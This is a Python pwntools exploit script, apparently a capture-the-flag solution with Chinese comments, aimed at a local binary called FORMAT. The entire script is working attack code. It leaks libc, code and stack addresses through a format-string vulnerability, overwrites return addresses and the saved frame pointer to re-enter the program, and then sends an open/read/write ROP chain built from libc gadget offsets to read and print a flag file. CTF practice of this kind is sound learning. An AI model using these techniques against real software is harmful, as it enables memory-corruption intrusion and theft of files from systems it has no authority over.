#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FORMAT')
elf = ELF('./FORMAT')
libc = ELF('./libc.so.6')

def pr(a,addr):
	log.success(a+': '+hex(addr))
'''
def exec_fmt(pad):
	p = process("./FORMAT")
	# send 还是 sendline以程序为准
	p.sendline(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''

#泄露一些地址
p.recvuntil("Please pwn me :)\n")
payload = "%p.%p.%p.%293$p." + 'A'*8
p.send(payload)
data = p.recv(0x70)
print(data)

libcbase = int(data[21:35],16) - 0x114992
_start = int(data[36:50],16)
codebase = _start &~ 0xfff
buf = int(data[0:14],16)
ret = buf + 0x818
new_ret = ret - 0x100
new_rbp = new_ret - 0x8 + 0x810
main_read_addr = codebase + 0xa2a

pr('libcbase ',libcbase)
pr('main_read_addr',main_read_addr)
pr('old_ret',ret)
pr('new_ret',new_ret)
pr('_start',_start)
pr('buf',buf)

#==============================================================

bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0x91396 # syscall; ret;
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret

#==============================================================

#gdb.attach(p)
#修改old_ret为_start重新执行
payload = fmtstr_payload(8, {ret : _start}, numbwritten = 0).ljust(0x80, "\x00")
p.send(payload)

#===========================again==============================

# 修改rbp让read可以写入rbp地址
p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(8, {new_ret-0x8 : new_rbp}, numbwritten = 0).ljust(0x80, "\x00") 
p.send(payload)

# 修改new_ret为read,重新执行read
p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(8, {new_ret : main_read_addr}, numbwritten = 0).ljust(0x80, "\x00") 
p.send(payload)

#=============================orw==============================

#写入rbp处
# open
payload  = b'./flag\x00\x00' # rbp
payload += p64(prdi_ret) + p64(new_ret - 0x8) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

#==============================================================

p.send(payload)
p.interactive()
